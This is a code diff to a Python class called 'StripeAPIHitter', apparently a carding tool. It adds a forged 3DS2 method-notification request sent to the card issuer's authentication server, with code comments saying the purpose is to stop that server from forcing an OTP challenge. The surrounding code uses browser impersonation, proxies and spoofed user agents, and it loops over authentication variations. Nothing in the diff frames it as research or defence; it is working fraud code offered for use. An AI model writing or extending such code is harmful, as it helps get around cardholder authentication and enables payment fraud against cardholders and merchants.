@@ -1848,7 +1848,30 @@ class StripeAPIHitter:
                                         _tds_server_trans_id = _source_obj.get("three_d_secure_2", {}).get("three_d_secure_server_transaction_id")
                                     if not _tds_server_trans_id:
                                         _tds_server_trans_id = sdk.get("server_transaction_id") or sdk.get("three_ds_server_trans_id")
-                                    
+
+                                    # Execute 3DS2 Method Notification POST to ACS method URL if present
+                                    # Real Stripe.js executes this hidden iframe POST before calling /v1/3ds2/authenticate.
+                                    # Skipping it causes ACS (e.g., wlp-acs.com) to force OTP challenge.
+                                    _method_url = sdk.get("three_ds_method_url")
+                                    if _method_url and _tds_server_trans_id:
+                                        try:
+                                            import base64 as _b64
+                                            _m_data = json.dumps({
+                                                "threeDSServerTransID": _tds_server_trans_id,
+                                                "threeDSMethodNotificationURL": "https://hooks.stripe.com/3ds2/method_response"
+                                            }).encode()
+                                            _m_b64 = _b64.b64encode(_m_data).decode().rstrip('=').replace('+', '-').replace('/', '_')
+                                            _m_headers = {
+                                                "content-type": "application/x-www-form-urlencoded",
+                                                "user-agent": profile["user_agent"]
+                                            }
+                                            await loop.run_in_executor(None, lambda: cffi_requests.post(
+                                                _method_url, data={"threeDSMethodData": _m_b64},
+                                                headers=_m_headers, proxies=proxies, timeout=10,
+                                                impersonate=profile["impersonate"]))
+                                        except Exception:
+                                            pass
+
                                     auth_variations = [
                                         {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "01", "fingerprintAttempted": True},
                                         {"threeDSCompInd": "Y", "threeDSRequestorChallengeInd": "02", "fingerprintAttempted": True},
@@ -1878,6 +1901,7 @@ class StripeAPIHitter:
                                         auth_data = {
                                             "source": source,
                                             "browser": json.dumps(browser),
+                                            "threeDSCompInd": var["threeDSCompInd"],
                                             "one_click_authn_device_support[hosted]": "false",
                                             "one_click_authn_device_support[same_origin_frame]": "false",
                                             "one_click_authn_device_support[spc_eligible]": "false",
